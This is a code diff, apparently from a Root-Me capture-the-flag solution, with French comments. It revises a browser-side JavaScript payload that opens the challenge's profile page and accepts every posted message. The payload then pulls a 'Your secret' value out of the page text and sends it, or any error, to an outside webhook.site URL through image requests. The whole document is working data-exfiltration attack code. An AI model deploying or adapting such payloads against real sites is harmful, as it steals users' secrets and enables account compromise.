@@ -7,14 +7,17 @@ var win = window.open("http://challenge01.root-me.org:58003/profile", "_blank");
 window.addEventListener('message', function(event) {
     // Ici on ne reçoit rien, mais pour respecter le format
     if (true) { // on accepte tout pour déclencher l'exfiltration
-        try {
-            // Récupérer le secret dans le document de la page courante
-            var secret = document.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];
-            // Exfiltrer vers le webhook
-            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
-        } catch(e) {
-            new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=' + encodeURIComponent(e.message);
-        }
+       try {
+    var match = document.body.innerText.match(/Your secret:\s*(.+)/);
+    if(match && match[1]){
+        var secret = match[1];
+        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
+    } else {
+        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=Secret_not_found';
+    }
+} catch(e){
+    new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=' + encodeURIComponent(e.message);
+}
     }
 });
 
